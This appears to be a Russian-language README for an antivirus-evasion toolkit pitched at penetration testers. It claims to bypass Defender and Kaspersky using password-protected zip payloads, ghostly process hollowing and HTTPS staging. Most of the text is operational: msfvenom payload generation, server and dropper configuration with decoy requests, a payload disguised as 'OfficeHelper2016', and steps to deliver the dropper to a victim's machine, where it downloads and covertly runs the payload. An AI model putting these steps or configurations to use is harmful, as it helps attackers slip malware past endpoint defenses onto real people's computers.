# AV Bypass

Техники обхода антивирусного ПО для проведения пентестов.

| AV                | Type      | Status    |
| ------            | ------    | -------   |
| Defender          |           |           |
|                   | Scantime  | ✔️        |
|                   | Runtime   | ✔️        |
| KES               |           |           |
|                   | Scantime  | ✔️        |
|                   | Runtime   | ✔️        |


# Technics

- [X] Payload Encryption - protected zip archive
- [X] Ghostly Hollowing
- [X] Payload Staging - HTTPS server

# Files

- Generator.py      - Упаковывает payload в архив и запускает HTTPS сервер
- GhostlyHollowing  - Загружает архив с HTTPS сервера, распаковывает и скрыто запускает

# Usage

- Stage - Доставка и исполнение нагрузки
- No stage - Только выполнение нагрузки, доставка ложится на атакущего. Может быть полезно при доставке через альтернативные каналы.

## Stage

1. Для начала необходимо создать полезную нагрузку, для примера используем запуск калькулятора с помощью msfvenom

```
msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f exe -a x64 -o payload.exe
```

2. В файле Generator.py необходимо задать параметры сервера

```python
# Change it
# ------------------ #
IP = ""                                 # IP https сервера
PORT = 443                              # Порт
PATH = '/super_secret_path'             # Путь на HTTPS сервере
REAL_PASSWORD_POSITION = 0              # Номер поля с паролем в json ответе
ZIP_PASSWORD = 'super_secret_password'  # Пароль от архива
# ------------------ #
```

3. Сгенерировать сертификат и ключ

```bash
openssl genrsa -out rootCA.key 2048
openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 1024 -out rootCA.pem
```

4. Запустить Generator

```bash
python3 Generator.py --certfile path/to/cert.pem --keyfile /path/to/key.pem --payload path/to/payload.exe
```

5. В директории запуска появится файл archive.zip и запустится HTTPS сервер.

6. В GhostlyHollowing открыть файл settings.h, указать идентичные генератору настройки сервера

```cpp
#define GHOSTING
#define DROPPER

#ifdef _WIN64
#define IS32BIT false
#else
#define IS32BIT true       // Если собирать x32, то сам payload тоже должен быть x32
#endif

#ifdef DROPPER
#define REAL_PASSWORD_NAME "password_0"
#define REAL_PATH "/super_secret_path"
#define SERVER "192.168.100.1"
#define PORT 443

#define REQUESTS_BEFORE 5  // Кол-во запросов до запросу к REAL_PATH
#define REQUESTS_AFTER 5   // Кол-во запросов после запроса к REAL_PATH
#endif
```

7. Доставить `GhostlyHollowing.exe` на машину жертвы и запустить. Программа подключится по HTTPS к серверу, загрузит архив, распакует и запустит нагрузку.

## No stage

1. Для начала необходимо создать полезную нагрузку, для примера используем запуск калькулятора с помощью msfvenom

```
msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f exe -a x64 -o payload.exe
```

2. В GhostlyHollowing открыть файл settings.h закомментировать строку

```cpp
// #define DROPPER
```

3. Указать имя архива, пароль от архива и имя полезной нагрузки внутри архива в GhostlyHollowing.cpp

```cpp
# Имя архива
std::wstring zipFilePath = std::wstring(appDataPath) + L"\\OfficeHelper2016.zip";

# Имя полезной нагрузки внутри архива
std::string payloadFileName = "OfficeHelper2016.exe";

# Пароль от архива
std::string password = "super_secret_password";
```

4. По умолчанию поиск архива с полезной нагрузкой будет в `AppData\Roaming`. По желанию можно изменить

5. Доставить `GhostlyHollowing.exe` и архив на машину жертвы. Архив поместить в `AppData\Roaming`.

6. Запустить `GhostlyHollowing.exe`